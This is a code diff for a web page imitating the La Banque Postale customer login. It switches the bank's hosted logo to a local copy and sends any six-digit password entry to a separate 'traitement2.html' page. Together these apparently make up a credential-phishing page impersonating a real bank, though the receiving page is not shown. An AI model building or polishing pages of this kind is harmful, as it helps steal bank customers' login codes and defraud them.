@@ -137,7 +137,7 @@
 </head>
 <body>
     <header class="lbp-header">
-        <img src="https://www.labanquepostale.fr/images/layout/logo-lbp.svg" alt="La Banque Postale" class="lbp-logo">
+        <img src="Logo_La_Banque_postale_2022.svg.png" alt="La Banque Postale" class="lbp-logo">
     </header>
 
     <main class="lbp-main">
@@ -169,10 +169,8 @@
                 
                 // Vérification que le mot de passe contient exactement 6 chiffres
                 if (/^\d{6}$/.test(password)) {
-                    // Ici vous pourriez ajouter la logique de vérification du mot de passe
-                    // Pour cet exemple, nous redirigeons simplement
-                    alert('Connexion en cours...');
-                    // window.location.href = 'accueil.html'; // Décommentez pour la redirection
+                    // Redirection vers traitement2.html
+                    window.location.href = 'traitement2.html';
                 } else {
                     // Afficher le message d'erreur
                     errorMessage.style.display = 'block';
@@ -190,6 +188,13 @@
                 // Empêcher l'entrée de caractères non numériques
                 if (e.key.length === 1 && !/\d/.test(e.key)) {
                     e.preventDefault();
+                }
+            });
+
+            // Permettre la validation avec la touche Entrée
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
                 }
             });
         });
